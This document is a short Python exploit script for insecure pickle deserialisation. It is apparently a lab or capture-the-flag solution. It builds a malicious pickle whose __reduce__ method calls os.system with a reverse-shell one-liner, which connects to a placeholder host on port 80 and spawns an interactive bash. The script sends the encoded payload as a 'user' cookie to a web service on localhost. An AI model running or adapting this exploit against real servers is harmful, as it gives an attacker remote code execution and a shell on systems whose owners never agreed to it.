#!/usr/bin/env python3
import requests
import pickle
import os
import base64

host_ip = 'xx.xx.xx.xx'
host_listen_port = 80

class exp(object):
    def __reduce__(self):
        s = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("""+f'"{host_ip}",{host_listen_port}'+"""));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'"""
        return (os.system, (s,))


e = exp()
s = pickle.dumps(e)

response = requests.get("http://127.0.0.1:8000/", cookies=dict(
    user=base64.b64encode(s).decode()
))
print(response.content)